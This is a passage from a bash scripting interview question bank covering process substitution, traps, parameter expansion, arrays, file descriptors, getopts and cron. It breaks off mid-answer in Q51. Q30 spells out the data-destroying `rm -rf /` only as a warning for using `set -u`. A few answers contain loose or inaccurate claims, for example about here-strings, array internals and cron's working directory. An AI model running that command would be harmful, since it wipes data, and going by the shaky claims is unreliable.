**Key takeaway:** Use single quotes for literal strings, double quotes for strings with variables, and backslash to escape individual special characters.

</details>

📖 **Theory:** [quoting-rules](./02_variables_and_data/variables.md#variable-naming-rules)


---

### Q28 · [Thinking] · `process-substitution`

> **What does `diff <(sort file1) <(sort file2)` do? What is `>()` used for?**

<details>
<summary>💡 Show Answer</summary>

**Answer:**
Process substitution creates a virtual file-like object connected to a command's output (or input).

- `<(command)` — provides the output of `command` as if it were a file. The shell creates a named pipe (or `/dev/fd/N`) and passes that path to the outer command.
- `>(command)` — provides a write target: anything written to it is piped as stdin to `command`.

```bash
# diff expects two file arguments — but we want to diff sorted output
diff <(sort file1.txt) <(sort file2.txt)
# Equivalent to: sort file1.txt > /tmp/a; sort file2.txt > /tmp/b; diff /tmp/a /tmp/b

# >() — write to a process
tee >(gzip > output.gz) >(wc -l) > /dev/null < input.txt
# Sends input to both a gzip process and wc simultaneously
```

**How to think through this:**
1. Commands like `diff`, `comm`, `paste` need file paths — `<()` gives them one that secretly reads from a process.
2. No temp files needed — the plumbing is handled by the shell.
3. `>()` is rarer but useful for fan-out: sending one stream to multiple downstream consumers.

**Key takeaway:** Use `<(command)` to feed command output to programs that expect file arguments, avoiding temporary files.

</details>

📖 **Theory:** [process-substitution](./05_input_output/pipes_and_redirection.md#process-substitution)


---

### Q29 · [Normal] · `exit-codes`

> **What are exit codes? What do 0, 1, 2, and 127 conventionally mean? How do you set your script's exit code?**

<details>
<summary>💡 Show Answer</summary>

**Answer:**
An exit code (return status) is an integer 0–255 that a process reports to its parent when it terminates. It communicates success or the nature of failure.

| Code | Conventional meaning |
|------|----------------------|
| `0` | Success |
| `1` | General error (catch-all) |
| `2` | Misuse of shell built-in or invalid arguments |
| `127` | Command not found |
| `128+N` | Killed by signal N (e.g., 130 = killed by Ctrl+C / SIGINT) |

```bash
#!/usr/bin/env bash

process_file() {
  if [[ ! -f "$1" ]]; then
    echo "Error: file not found: $1" >&2
    return 1
  fi
  # ... do work ...
  return 0
}

process_file "$1" || exit 1

# Script's final exit code is the last command's exit code
# Or set explicitly:
exit 0
```

**How to think through this:**
1. `exit N` at the end of a script sets its exit code explicitly.
2. Without `exit`, the script exits with the code of the last command run.
3. Always send error messages to stderr (`>&2`), not stdout.

**Key takeaway:** Return 0 for success and a non-zero code for failure; use `exit 1` for general errors and document custom codes in your script's header.

</details>

📖 **Theory:** [exit-codes](./06_error_handling/exit_codes.md#exit-codes-in-bash)


---

### Q30 · [Critical] · `set-options`

> **What do `set -e`, `set -u`, `set -x`, and `set -o pipefail` do? Why should most production scripts start with `set -euo pipefail`?**

<details>
<summary>💡 Show Answer</summary>

**Answer:**

| Option | Behavior |
|--------|----------|
| `set -e` | Exit immediately if any command exits with non-zero status |
| `set -u` | Treat unset variables as errors (exit instead of silently using empty string) |
| `set -x` | Print each command before executing it (debug trace) |
| `set -o pipefail` | A pipeline fails if **any** command in it fails, not just the last one |

```bash
#!/usr/bin/env bash
set -euo pipefail
```

Why combine them:
- Without `-e`: a failed command is silently ignored and the script keeps running in a broken state.
- Without `-u`: `rm -rf "$DIR/"` with an unset `DIR` becomes `rm -rf /` — catastrophic.
- Without `pipefail`: `false | grep foo` exits 0 because `grep` succeeds. The failure of `false` is hidden.
- Together: the script fails loudly and early at the first sign of trouble.

**How to think through this:**
1. Think of these as seat belts — they cost nothing but prevent disasters.
2. `set -x` is for debugging, not production — it floods stderr with output.
3. `IFS=$'\n\t'` is sometimes added too, to avoid accidental word splitting.

**Key takeaway:** Start every non-trivial bash script with `set -euo pipefail` — it turns silent failures into loud, catchable errors.

</details>

📖 **Theory:** [set-options](./06_error_handling/exit_codes.md#exit-n-setting-your-scripts-exit-code)


---

### Q31 · [Design] · `trap-basics`

> **What does `trap 'cleanup' EXIT` do? Write a script that creates a temp file and guarantees cleanup even on error.**

<details>
<summary>💡 Show Answer</summary>

**Answer:**
`trap` registers a command to run when the shell receives a signal or reaches a specific condition. `EXIT` fires whenever the script exits — whether normally, via `exit`, or due to an error with `set -e`.

```bash
#!/usr/bin/env bash
set -euo pipefail

TMPFILE=$(mktemp /tmp/myscript.XXXXXX)

cleanup() {
  echo "Cleaning up $TMPFILE" >&2
  rm -f "$TMPFILE"
}

trap cleanup EXIT

# Do work with the temp file
echo "Processing data..." > "$TMPFILE"
some_command_that_might_fail "$TMPFILE"

echo "Done."
# cleanup() runs automatically here regardless of how the script exits
```

Common signals to trap:
- `EXIT` — script exit (any reason)
- `INT` — Ctrl+C
- `TERM` — kill signal
- `ERR` — any command that fails (with `set -e`)

**How to think through this:**
1. `trap` is like a `finally` block in Python — it always runs.
2. Register the trap immediately after creating the resource to avoid leaks.
3. Use `mktemp` to create unique temp files, never hardcode `/tmp/myfile`.

**Key takeaway:** Use `trap cleanup EXIT` immediately after creating any resource (temp files, background processes) to guarantee cleanup regardless of how the script exits.

</details>

📖 **Theory:** [trap-basics](./06_error_handling/traps.md#traps-and-signal-handling-in-bash)


---

### Q32 · [Normal] · `here-string`

> **What is the difference between a heredoc (`<< EOF`) and a here-string (`<<<`)? Give an example of each.**

<details>
<summary>💡 Show Answer</summary>

**Answer:**
Both redirect text as stdin to a command, but they differ in scope.

**Heredoc** — multi-line block of text:
```bash
# Standard heredoc
cat << EOF
Hello, $USER
Today is $(date +%Y-%m-%d)
EOF

# Indented heredoc with <<- (strips leading tabs, not spaces)
cat <<-EOF
	Line one
	Line two
EOF

# Quoted delimiter — no expansion
cat << 'EOF'
Literal $variable and $(command)
EOF
```

**Here-string** — single string as stdin:
```bash
# Feed a string directly to a command
grep "hello" <<< "hello world"

# Check if a variable contains a pattern
if grep -q "error" <<< "$log_output"; then
  echo "Errors found"
fi

# No temp file needed
base64 <<< "encode this"
```

**How to think through this:**
1. Heredoc is for multi-line content like config files, SQL queries, or emails.
2. Here-string (`<<<`) is a concise one-liner alternative to `echo "..." | command`.
3. `<<< "string"` runs in the current shell (no subshell), so variable mutations inside persist.

**Key takeaway:** Use heredoc for multi-line blocks and `<<<` as a clean single-string alternative to `echo | command`.

</details>

📖 **Theory:** [here-string](./05_input_output/pipes_and_redirection.md#here-strings)


---

### Q33 · [Thinking] · `parameter-expansion`

> **What do these parameter expansions do: `${var:-default}`, `${var:=default}`, `${var:?error}`, `${var:+alt}`?**

<details>
<summary>💡 Show Answer</summary>

**Answer:**

| Expansion | Behavior |
|-----------|----------|
| `${var:-default}` | Use `default` if `var` is unset or empty. Does **not** modify `var`. |
| `${var:=default}` | Assign `default` to `var` if unset or empty. `var` **is** modified. |
| `${var:?error msg}` | If `var` is unset or empty, print `error msg` and **exit the script**. |
| `${var:+alt}` | Use `alt` if `var` **is** set and non-empty. If unset/empty, use empty string. |

```bash
name=""

echo ${name:-"Anonymous"}    # Anonymous (name unchanged)
echo ${name:="Anonymous"}    # Anonymous (name is now "Anonymous")
echo ${name:?"Name required"} # exits with error if unset

feature_flag="enabled"
echo ${feature_flag:+"--enable-feature"}   # --enable-feature
unset feature_flag
echo ${feature_flag:+"--enable-feature"}   # (empty)
```

**How to think through this:**
1. `:` before the operator means "treat empty string same as unset." Without `:` (e.g., `${var-default}`), only truly unset variables trigger the behavior.
2. `:-` is the most common — safe defaults without side effects.
3. `:=` is useful for lazy initialization of global config variables.
4. `:?` is a guard clause — crash early with a clear message rather than silently misbehaving.
5. `:+` is the inverse of `:-` — useful for conditional flags.

**Key takeaway:** Use `${var:-default}` for safe defaults, `${var:?msg}` to enforce required variables, and `${var:+flag}` to conditionally include options.

</details>

📖 **Theory:** [parameter-expansion](./02_variables_and_data/variables.md#variables-and-data-in-bash)


---

## 🟡 Tier 2 — Intermediate

### Q34 · [Normal] · `string-manipulation`

> **What does `${#var}` give? Show how to trim leading/trailing whitespace from a string in bash without external tools.**

<details>
<summary>💡 Show Answer</summary>

**Answer:**
`${#var}` returns the **length** of the string stored in `var`.

```bash
str="  hello world  "
echo ${#str}   # 16
```

To trim whitespace without external tools, use pattern substitution:

```bash
# Trim leading whitespace
str="${str#"${str%%[![:space:]]*}"}"

# Trim trailing whitespace
str="${str%"${str##*[![:space:]]}"}"

# One-liner (trim both)
trimmed="${str#"${str%%[![:space:]]*}"}"
trimmed="${trimmed%"${trimmed##*[![:space:]]}"}"
echo "'$trimmed'"   # 'hello world'
```

**How to think through this:**
1. `${str%%[![:space:]]*}` strips everything from the first non-space character onward — leaving only leading spaces
2. `${str#...}` then strips that leading-spaces prefix from the original string
3. Same logic mirrored with `%` handles the trailing end

**Key takeaway:** `${#var}` is a length check; whitespace trimming is done by using pattern expansion to isolate and then strip the whitespace prefix/suffix.

</details>

📖 **Theory:** [string-manipulation](./02_variables_and_data/string_operations.md#string-operations-in-bash)


---

### Q35 · [Normal] · `string-slicing`

> **What does `${var:2:5}` do? What do `${var##*/}` and `${var%.*}` do? (Hint: path manipulation)**

<details>
<summary>💡 Show Answer</summary>

**Answer:**
- `${var:2:5}` — substring: start at index 2, take 5 characters
- `${var##*/}` — strip the longest leading match of `*/` — gives the **basename** (filename only)
- `${var%.*}` — strip the shortest trailing match of `.*` — strips the **file extension**

```bash
var="/home/user/docs/report.tar.gz"

echo "${var:6:4}"     # user  (offset 6, length 4)
echo "${var##*/}"     # report.tar.gz  (basename)
echo "${var%.*}"      # /home/user/docs/report.tar  (remove last extension)
echo "${var%%.*}"     # /home/user/docs/report       (remove all extensions)
```

**How to think through this:**
1. `:offset:length` is direct index slicing — zero-based
2. `#` strips from the front; `##` is greedy (longest match)
3. `%` strips from the back; `%%` is greedy — so `%.*` removes `.gz`, `%%.*` removes `.tar.gz`

**Key takeaway:** `#`/`##` eat from the left; `%`/`%%` eat from the right — doubling the symbol makes the match greedy.

</details>

📖 **Theory:** [string-slicing](./02_variables_and_data/string_operations.md#string-operations-in-bash)


---

### Q36 · [Normal] · `regex-in-bash`

> **How do you use `=~` to test a string against a regex in bash? What is stored in `BASH_REMATCH`?**

<details>
<summary>💡 Show Answer</summary>

**Answer:**
The `=~` operator inside `[[ ]]` tests a string against an **extended regular expression**. Captures are stored in the `BASH_REMATCH` array.

```bash
input="Order #12345 placed on 2024-03-15"

if [[ $input =~ ([0-9]{5}).*([0-9]{4}-[0-9]{2}-[0-9]{2}) ]]; then
    echo "Full match: ${BASH_REMATCH[0]}"   # entire matched portion
    echo "Order ID:   ${BASH_REMATCH[1]}"   # first capture group  -> 12345
    echo "Date:       ${BASH_REMATCH[2]}"   # second capture group -> 2024-03-15
fi
```

**How to think through this:**
1. `[[ string =~ pattern ]]` — do NOT quote the pattern or it becomes a literal string match
2. `BASH_REMATCH[0]` is always the full match
3. `BASH_REMATCH[1]`, `[2]`, etc. correspond to parenthesized capture groups left to right
4. The array is only populated when the match succeeds

**Key takeaway:** `=~` brings regex into pure bash — never quote the pattern, and read captures from `BASH_REMATCH`.

</details>

📖 **Theory:** [regex-in-bash](./03_control_flow/conditionals.md#conditionals-in-bash)


---

### Q37 · [Normal] · `arrays-advanced`

> **How do you remove an element from a bash array? Why is there no direct "delete index N" — what actually happens?**

<details>
<summary>💡 Show Answer</summary>

**Answer:**
`unset arr[N]` removes the element at index N, but it leaves a **hole** — bash arrays are sparse, so indices do not shift.

```bash
arr=(apple banana cherry date elderberry)
echo "${arr[@]}"      # apple banana cherry date elderberry
echo "${!arr[@]}"     # 0 1 2 3 4  (indices)

unset arr[2]          # remove "cherry"
echo "${arr[@]}"      # apple banana date elderberry
echo "${!arr[@]}"     # 0 1 3 4  <-- index 2 is GONE, 3 and 4 stay

# To re-index (close the gap):
arr=("${arr[@]}")
echo "${!arr[@]}"     # 0 1 2 3
```

**How to think through this:**
1. Bash arrays are associative under the hood for indexed arrays — they map integer keys to values
2. `unset arr[2]` deletes the key 2; indices 3+ do not slide down
3. Reassigning `arr=("${arr[@]}")` expands all values and re-packs them into a fresh 0-based array

**Key takeaway:** Bash array deletion leaves sparse holes; re-pack with `arr=("${arr[@]}")` if you need contiguous indices.

</details>

📖 **Theory:** [arrays-advanced](./02_variables_and_data/arrays.md#arrays-in-bash)


---

### Q38 · [Normal] · `mapfile-readarray`

> **What does `mapfile -t lines < file.txt` do? Why is this better than `lines=$(cat file.txt)` for large files?**

<details>
<summary>💡 Show Answer</summary>

**Answer:**
`mapfile -t lines < file.txt` reads each line of `file.txt` into the array `lines`, stripping the trailing newline from each element (`-t`).

```bash
mapfile -t lines < /etc/passwd
echo "Line count: ${#lines[@]}"
echo "First line: ${lines[0]}"
echo "Last line:  ${lines[-1]}"

# Iterate safely (handles spaces in lines)
for line in "${lines[@]}"; do
    echo "Processing: $line"
done
```

**Why it is better than `lines=$(cat file.txt)`:**
1. `$()` captures output as a single string — you then have to split it, which is fragile with special characters
2. `mapfile` reads directly into an array — each line is one element, no word-splitting issues
3. For large files, `mapfile` avoids creating a massive string in memory then splitting it
4. `mapfile` preserves blank lines; string splitting collapses them

**How to think through this:**
1. `-t` strips the trailing `\n` from each line (without it, `${lines[0]}` ends with a newline)
2. `< file.txt` redirects the file into `mapfile` without spawning a subshell (unlike `cat file.txt | mapfile`)
3. Use `mapfile -t -n 100 lines < file.txt` to read only the first 100 lines

**Key takeaway:** `mapfile` is the idiomatic, safe way to read a file line-by-line into an array — it avoids word-splitting pitfalls and subshell overhead.

</details>

📖 **Theory:** [mapfile-readarray](./02_variables_and_data/arrays.md#arrays-in-bash)


---

### Q39 · [Normal] · `file-io-advanced`

> **How do you open a file descriptor in bash with `exec 3< file.txt`? How do you read from it and close it?**

<details>
<summary>💡 Show Answer</summary>

**Answer:**
`exec 3< file.txt` opens `file.txt` for reading and assigns it to **file descriptor 3**. You can then use `read` with the `-u` flag to read from it.

```bash
exec 3< /etc/hosts          # open fd 3 for reading

while IFS= read -r -u3 line; do
    echo "Got: $line"
done

exec 3<&-                   # close fd 3

# Writing: exec 4> output.txt
exec 4> /tmp/output.txt
echo "hello" >&4
exec 4>&-                   # close fd 4

# Read/write: exec 5<> file.txt
```

**How to think through this:**
1. File descriptors 0 (stdin), 1 (stdout), 2 (stderr) are always open — custom FDs start at 3
2. `exec N< file` opens for reading; `exec N> file` for writing; `exec N<> file` for both
3. `read -u3` reads one line from FD 3 (without affecting stdin)
4. `exec N<&-` closes the file descriptor — always do this to avoid resource leaks
5. Use `{fd}` syntax in bash 4.1+ to auto-assign an available FD: `exec {fd}< file.txt`

**Key takeaway:** Named file descriptors let you keep multiple files open simultaneously and read them independently — always close with `exec N<&-`.

</details>

📖 **Theory:** [file-io-advanced](./05_input_output/file_operations.md#file-operations-in-bash)


---

### Q40 · [Normal] · `output-formatting`

> **How do `printf` and `echo` differ? Write a `printf` command that prints a formatted table with aligned columns.**

<details>
<summary>💡 Show Answer</summary>

**Answer:**
`printf` is precise and portable; `echo` is simple but inconsistent across shells.

Key differences:
- `echo` adds a newline automatically; `printf` only adds what you specify in the format string
- `echo -e` interprets escapes — but `-e` is not POSIX and behaves differently across shells
- `printf` supports format specifiers (`%s`, `%d`, `%f`), width, and padding

```bash
# Formatted table with aligned columns
printf "%-20s %-10s %8s\n" "NAME" "STATUS" "SIZE"
printf "%-20s %-10s %8s\n" "----" "------" "----"
printf "%-20s %-10s %8d\n" "backup.tar.gz"   "OK"      204800
printf "%-20s %-10s %8d\n" "logs.zip"        "WARN"     51200
printf "%-20s %-10s %8d\n" "database.dump"   "ERROR"  1048576
```

Output:
```
NAME                 STATUS        SIZE
----                 ------        ----
backup.tar.gz        OK          204800
logs.zip             WARN         51200
database.dump        ERROR      1048576
```

**How to think through this:**
1. `%-20s` — left-align (`-`), pad/truncate to 20 chars, string type (`s`)
2. `%8d` — right-align, pad to 8 chars, integer type (`d`)
3. `\n` must be explicit in `printf` — it does not auto-append a newline

**Key takeaway:** Prefer `printf` in scripts for predictable, portable, formatted output — `echo` is for simple messages only.

</details>

📖 **Theory:** [output-formatting](./05_input_output/file_operations.md#file-operations-in-bash)


---

### Q41 · [Normal] · `tee-command`

> **What does `command | tee file.txt | grep error` do? When is `tee` useful in pipeline scripts?**

<details>
<summary>💡 Show Answer</summary>

**Answer:**
`tee` splits the stream — it writes to `file.txt` AND passes the same output downstream to `grep error`. Think of it as a T-junction in a pipe.

```bash
./deploy.sh | tee deploy.log | grep -E "ERROR|WARN"
#             ^saves full log  ^shows only errors on screen

# Append mode
command | tee -a existing.log | next-step

# Multiple outputs
command | tee file1.txt file2.txt | downstream

# Writing to stderr AND continuing pipeline
command | tee /dev/stderr | next-step
```

**How to think through this:**
1. Without `tee`: you must choose — save to file OR pipe to next command, not both
2. `tee` solves this by duplicating: one copy to file, one copy to stdout (for the next pipe stage)
3. In scripts: use `tee` to keep a full log while also filtering for real-time alerts
4. `-a` appends instead of overwriting

**Key takeaway:** `tee` is the pipeline equivalent of "save a copy and keep going" — essential when you need both a full log and a filtered live view.

</details>

📖 **Theory:** [tee-command](./05_input_output/pipes_and_redirection.md#overwrite-an-entire-commands-output-to-a-file)


---

### Q42 · [Normal] · `subshells`

> **What is a subshell? How does `( cd /tmp; ls )` differ from `cd /tmp; ls`? How does `$(...)` create a subshell?**

<details>
<summary>💡 Show Answer</summary>

**Answer:**
A **subshell** is a child copy of the current shell process. Changes inside it (directory, variables, `set` options) do not affect the parent.

```bash
# Subshell: changes are isolated
pwd                          # /home/user
( cd /tmp; ls; pwd )         # runs in /tmp, lists /tmp
pwd                          # still /home/user  <-- unchanged

# No subshell: changes persist
cd /tmp; ls; pwd             # now you ARE in /tmp
pwd                          # /tmp  <-- changed

# Variables in subshells
x=10
( x=99; echo $x )            # 99
echo $x                      # 10  <-- parent unchanged

# $(...) also runs in a subshell
result=$(cd /tmp; pwd)        # captures /tmp but parent dir unchanged
pwd                           # still original directory
```

**How to think through this:**
1. `( )` explicitly forks a subshell — cheap isolation for temporary directory or variable changes
2. `$(...)` command substitution also forks — that is why variable assignments inside it are invisible to the parent
3. Pipelines (`cmd1 | cmd2`) also create subshells for each stage in bash (unlike zsh/ksh)
4. `{ }` (brace grouping) does NOT create a subshell — changes persist

**Key takeaway:** Parentheses `( )` create an isolated subshell — use them when you need temporary changes that must not leak back to the caller.

</details>

📖 **Theory:** [subshells](./04_functions/scope_and_return.md#now-subshells-and-child-scripts-can-call-log)


---

### Q43 · [Normal] · `coprocess`

> **What is `coproc` in bash? Describe a use case where it is more appropriate than a named pipe.**

<details>
<summary>💡 Show Answer</summary>

**Answer:**
`coproc` starts a background process with **two-way communication** — the parent can write to its stdin and read from its stdout, all through automatically created file descriptors.

```bash
# Basic coproc
coproc BC { bc -l; }

# Write to coprocess stdin
echo "scale=4; 22/7" >&"${BC[1]}"

# Read from coprocess stdout
read -r result <&"${BC[0]}"
echo "Result: $result"    # Result: 3.1428

# Named coproc gives you: BC[0]=read-fd, BC[1]=write-fd, BC_PID
```

**Why coproc over named pipe:**
- Named pipes need two `mkfifo` calls for bidirectional communication, plus careful ordering to avoid deadlock
- `coproc` handles bidirectional IPC automatically in a single command
- Use `coproc` when you need an ongoing dialogue with a long-running process (e.g., a REPL, database CLI, or calculator)
- Named pipes are better for unrelated producer/consumer processes that don't share a script context

**How to think through this:**
1. `coproc NAME { command; }` — NAME is used to access `NAME[0]` (read) and `NAME[1]` (write)
2. Without a name, bash uses the default `COPROC` array
3. The coprocess runs concurrently — you send it work and retrieve results as needed

**Key takeaway:** `coproc` is bidirectional IPC built into bash — use it when you need persistent back-and-forth with a subprocess from within the same script.

</details>

📖 **Theory:** [coprocess](./05_input_output/pipes_and_redirection.md#pipes-and-redirection)


---

### Q44 · [Normal] · `named-pipes`

> **What is a named pipe (FIFO)? How do you create one with `mkfifo`? Give a producer-consumer example.**

<details>
<summary>💡 Show Answer</summary>

**Answer:**
A **named pipe (FIFO)** is a special file that acts as a pipe but has a filesystem path — allowing unrelated processes to communicate. Data written to it blocks until a reader is present.

```bash
# Create a named pipe
mkfifo /tmp/mypipe

# Producer (runs in background)
producer() {
    for i in {1..5}; do
        echo "item-$i"
        sleep 0.5
    done > /tmp/mypipe
}

# Consumer
consumer() {
    while IFS= read -r line; do
        echo "Processing: $line"
    done < /tmp/mypipe
}

producer &
consumer

# Clean up
rm /tmp/mypipe
```

**How to think through this:**
1. `mkfifo` creates a FIFO inode — `ls -l` shows `p` as file type
2. A write to the FIFO blocks until a reader opens the other end — and vice versa
3. Data flows in order (first in, first out) but is never stored on disk
4. Useful for decoupling pipeline stages that run as separate processes

**Key takeaway:** Named pipes give anonymous pipes a filesystem address — enabling IPC between processes that don't share a parent shell.

</details>

📖 **Theory:** [named-pipes](./05_input_output/pipes_and_redirection.md#pipes-and-redirection)


---

### Q45 · [Normal] · `signal-handling`

> **What does `trap 'handler' SIGTERM SIGINT` do in a script? Why is signal handling important in long-running scripts?**

<details>
<summary>💡 Show Answer</summary>

**Answer:**
`trap 'handler' SIGTERM SIGINT` registers a handler that runs when the script receives `SIGTERM` (graceful stop) or `SIGINT` (Ctrl+C). Without it, these signals immediately terminate the script, leaving no chance to clean up.

```bash
#!/usr/bin/env bash

LOCKFILE=/tmp/myapp.lock
TMPDIR_WORK=$(mktemp -d)

cleanup() {
    echo "Signal received — cleaning up..."
    rm -rf "$TMPDIR_WORK"
    rm -f "$LOCKFILE"
    exit 1
}

trap 'cleanup' SIGTERM SIGINT SIGHUP

echo $$ > "$LOCKFILE"

# Long-running work
while true; do
    process_batch
    sleep 5
done
```

**Why it matters:**
1. Long-running scripts often create temp files, lock files, or hold resources — abrupt exit leaks these
2. In cron jobs or daemons, `SIGTERM` is the standard "please stop" signal from the OS or orchestrator
3. Without a trap, `Ctrl+C` mid-operation can leave data in a corrupted half-written state
4. Containers send `SIGTERM` before `SIGKILL` — your script has a window to clean up

**Key takeaway:** Always trap `SIGTERM` and `SIGINT` in scripts that create resources — it is the difference between a graceful shutdown and a resource leak.

</details>

📖 **Theory:** [signal-handling](./06_error_handling/traps.md#traps-and-signal-handling-in-bash)


---

### Q46 · [Normal] · `error-handling-pattern`

> **Write a reusable error handling pattern using `set -e`, `trap ERR`, and a `die()` function that prints filename + line number.**

<details>
<summary>💡 Show Answer</summary>

**Answer:**

```bash
#!/usr/bin/env bash
set -euo pipefail

# die: print error context and exit
die() {
    local msg="${1:-Unknown error}"
    local code="${2:-1}"
    echo "[ERROR] ${BASH_SOURCE[1]}:${BASH_LINENO[0]} — $msg" >&2
    exit "$code"
}

# ERR trap: called automatically when any command fails (due to set -e)
trap 'die "Command failed: $BASH_COMMAND" $?' ERR

# Validate required env vars
require_var() {
    local var_name="$1"
    [[ -n "${!var_name:-}" ]] || die "Required variable $var_name is not set"
}

# Usage
require_var "DATABASE_URL"

cp /nonexistent/file /tmp/   # triggers ERR trap automatically
```

**How to think through this:**
1. `set -e` exits on any non-zero command — `trap ERR` fires just before that exit
2. `BASH_SOURCE[1]` is the script filename; `BASH_LINENO[0]` is the line that triggered the error
3. `$BASH_COMMAND` holds the exact command that failed — invaluable for debugging
4. `die` can also be called manually with a descriptive message for validation errors

**Key takeaway:** The triple combination of `set -euo pipefail` + `trap ERR` + `die()` gives you automatic error capture with precise location — production scripts should always have this.

</details>

📖 **Theory:** [error-handling-pattern](./06_error_handling/exit_codes.md#pattern-4-trap-err-for-automatic-error-handling-see-traps-section)


---

### Q47 · [Normal] · `debugging-bash`

> **What does `bash -x script.sh` do? How do you selectively enable/disable tracing around a problematic section?**

<details>
<summary>💡 Show Answer</summary>

**Answer:**
`bash -x script.sh` runs the script in **trace mode** — every command is printed to stderr (prefixed with `+`) before it executes, with variables already expanded.

```bash
# Run entire script with tracing
bash -x ./deploy.sh

# Output looks like:
# + cd /opt/app
# + git pull origin main
# + BRANCH=main
```

For selective tracing around a specific section:

```bash
#!/usr/bin/env bash

echo "Normal section — no trace"

set -x   # enable trace
result=$(complex_function "$arg1" "$arg2")
validate_output "$result"
set +x   # disable trace

echo "Back to normal"
```

**Advanced options:**
```bash
# Change the trace prefix (helpful with nested subshells)
PS4='+(${BASH_SOURCE}:${LINENO}): '
set -x

# Log trace to a file instead of stderr
exec 5>/tmp/trace.log
BASH_XTRACEFD=5
set -x
```

**How to think through this:**
1. `set -x` is equivalent to `bash -x` but can be toggled mid-script
2. `set +x` turns it back off
3. `PS4` controls the prefix — the default `+` gives little context; adding source/line makes traces readable
4. `BASH_XTRACEFD` redirects trace output to a file descriptor so it does not pollute stdout/stderr

**Key takeaway:** `set -x` / `set +x` around the suspected section is the fastest way to debug bash without adding `echo` statements everywhere.

</details>

📖 **Theory:** [debugging-bash](./06_error_handling/debugging.md#debugging-bash-scripts)


---

### Q48 · [Normal] · `exit-trap`

> **What is the difference between `trap 'cleanup' EXIT` and `trap 'cleanup' ERR`? Can you have both?**

<details>
<summary>💡 Show Answer</summary>

**Answer:**
- `trap 'cleanup' EXIT` — fires when the script exits **for any reason**: normal completion, `exit N`, or killed by signal (after signal trap)
- `trap 'cleanup' ERR` — fires only when a **command returns a non-zero exit code** (and `set -e` is active or the ERR trap is explicitly set)

```bash
#!/usr/bin/env bash
set -euo pipefail

TMPFILE=$(mktemp)

# EXIT: always runs — perfect for guaranteed cleanup
trap 'rm -f "$TMPFILE"; echo "EXIT trap fired"' EXIT

# ERR: runs on failure — perfect for error logging
trap 'echo "ERR trap: failed at line $LINENO" >&2' ERR

echo "Working..."
false    # triggers ERR trap, then set -e causes exit, which triggers EXIT trap
```

**Key distinction:**

| Trap | When it fires | Use for |
|------|--------------|---------|
| `EXIT` | Always on script end | Resource cleanup (temp files, locks) |
| `ERR` | On command failure | Error logging, metrics, alerting |

Yes, you can have both simultaneously — they serve different purposes and do not conflict. On an error with `set -e`, `ERR` fires first, then `EXIT` fires as the script terminates.

**How to think through this:**
1. `EXIT` is the "finally block" of bash — it runs no matter what
2. `ERR` is the "catch block" — it runs only when something goes wrong
3. Both together give you: error context (ERR) + guaranteed resource release (EXIT)

**Key takeaway:** Use `EXIT` for cleanup and `ERR` for error reporting — together they give you bash's equivalent of try/catch/finally.

</details>

📖 **Theory:** [exit-trap](./06_error_handling/traps.md#the-most-important-trap-exit)


---

### Q49 · [Normal] · `getopts`

> **What is `getopts` used for? Write a script that accepts `-f filename`, `-v` (verbose flag), and `-h` (help).**

<details>
<summary>💡 Show Answer</summary>

**Answer:**
`getopts` parses short command-line options (`-f`, `-v`, `-h`) in a POSIX-compliant way. It handles option ordering, combined flags (`-vf file`), and argument extraction.

```bash
#!/usr/bin/env bash
set -euo pipefail

usage() {
    echo "Usage: $0 [-f filename] [-v] [-h]"
    echo "  -f FILE    Input file to process"
    echo "  -v         Enable verbose output"
    echo "  -h         Show this help"
    exit 0
}

VERBOSE=false
FILENAME=""

while getopts ":f:vh" opt; do
    case "$opt" in
        f) FILENAME="$OPTARG" ;;
        v) VERBOSE=true ;;
        h) usage ;;
        :) echo "Error: -$OPTARG requires an argument" >&2; exit 1 ;;
        \?) echo "Error: unknown option -$OPTARG" >&2; exit 1 ;;
    esac
done

shift $((OPTIND - 1))   # remove parsed options; $@ now holds positional args

[[ -z "$FILENAME" ]] && { echo "Error: -f is required" >&2; exit 1; }
$VERBOSE && echo "Verbose mode on. File: $FILENAME"
```

**How to think through this:**
1. The option string `":f:vh"` — leading `:` enables silent error mode; `f:` means `-f` takes an argument; `v` and `h` are flags only
2. `OPTARG` holds the argument value for options that require one (like `-f`)
3. `:` in the case block catches "missing argument"; `\?` catches unknown options
4. `shift $((OPTIND - 1))` removes all parsed flags so `$1`, `$2`... are clean positional args

**Key takeaway:** `getopts` is the standard bash option parser — always use it instead of manually parsing `$1`, `$2` for flag-based interfaces.

</details>

📖 **Theory:** [getopts](./05_input_output/user_input.md#user-input-in-bash)


---

### Q50 · [Normal] · `script-arguments-validation`

> **Write a function that validates script arguments: exactly 2 args required, first must be a file that exists, second must be a positive integer.**

<details>
<summary>💡 Show Answer</summary>

**Answer:**

```bash
#!/usr/bin/env bash
set -euo pipefail

die() {
    echo "[ERROR] $*" >&2
    echo "Usage: $0 <existing-file> <positive-integer>" >&2
    exit 1
}

validate_args() {
    local file="$1"
    local count="$2"

    # Check arg count
    [[ $# -eq 2 ]] || die "Expected exactly 2 arguments, got $#"

    # Validate file exists and is a regular file
    [[ -f "$file" ]] || die "First argument must be an existing file: '$file' not found"

    # Validate positive integer: matches only digits, value > 0
    [[ "$count" =~ ^[0-9]+$ ]] || die "Second argument must be a positive integer: got '$count'"
    [[ "$count" -gt 0 ]]       || die "Second argument must be greater than 0: got '$count'"

    echo "Validation passed: file='$file', count=$count"
}

validate_args "$@"

# Proceed with work
FILE="$1"
COUNT="$2"
echo "Processing $FILE with count $COUNT"
```

**How to think through this:**
1. Check arg count first — it is the cheapest check and gates everything else
2. `-f` tests for a regular file (not a directory or symlink to nowhere)
3. `=~ ^[0-9]+$` ensures the string is all digits — preventing strings like `"3abc"` or `"-5"`
4. The integer comparison `-gt 0` then confirms it is not zero
5. Always print usage in the error message so the user knows how to fix it

**Key takeaway:** Validate early and fail loudly — a script that rejects bad input immediately is far easier to debug than one that silently proceeds and fails halfway through.

</details>

📖 **Theory:** [script-arguments-validation](./05_input_output/user_input.md#reading-from-arguments-vs-read)


---

### Q51 · [Normal] · `cron-scripting`

> **What environment differences does a cron job have vs interactive shell? Name 3 common cron script failures and how to prevent them.**

<details>
<summary>💡 Show Answer</summary>

**Answer:**
Cron runs scripts in a **minimal, non-interactive environment** — it does not load your `.bashrc`, `.bash_profile`, or user environment.

Key environment differences:

| Aspect | Interactive Shell | Cron Job |
|--------|------------------|----------|
| `PATH` | Full user PATH | `/usr/bin:/bin` only |
| Shell | Your default shell | `/bin/sh` (not bash) |
| `~` / `$HOME` | Set correctly | May be root or unset |
| Env vars | Full user env | Minimal set |
| Working dir | Current dir | Root `/` |

**3 common failures and fixes:**

**1. Command not found (`PATH` too short)**
```bash
# Bad: relies on user PATH
